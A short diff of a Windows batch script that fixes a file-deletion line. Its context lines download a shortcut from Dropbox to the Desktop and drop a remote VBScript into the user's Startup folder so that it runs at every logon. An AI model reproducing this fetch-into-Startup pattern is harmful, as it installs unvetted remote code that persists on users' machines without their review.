@@ -525,7 +525,7 @@ if exist "%ZIP_FINAL%" (
 endlocal
 
 :link
-if exist "%USERPROFILE%\Desktop\Manager-V1.lnk" del
+if exist "%USERPROFILE%\Desktop\Manager-V1.lnk" del "%USERPROFILE%\Desktop\Manager-V1.lnk"
 if exist "%USERPROFILE%\Desktop\Reinicia-Camera.lnk" exit
 powershell -Command "(New-Object Net.WebClient).DownloadFile('https://www.dropbox.com/scl/fi/2h05ugy511yddlo1910eh/Manager-V1.lnk?rlkey=3ou61axp8vr1ss4xh2ybwj3jx&st=8xs55m9c&dl=1', [Environment]::GetFolderPath('Desktop') + '\Reinicia-Camera.lnk')"
 goto :eof
@@ -533,4 +533,5 @@ goto :eof
 :inicializar
 powershell -Command "(New-Object Net.WebClient).DownloadFile('https://www.dropbox.com/scl/fi/akorc9rgtubicumxfgv8b/Menssagem.vbs?rlkey=0yxqyoicv6u83hlya8bnlar0r&st=vxv6y6ax&dl=1', [Environment]::GetFolderPath('Startup') + '\Menssagem.vbs')"
 goto :eof
+
 
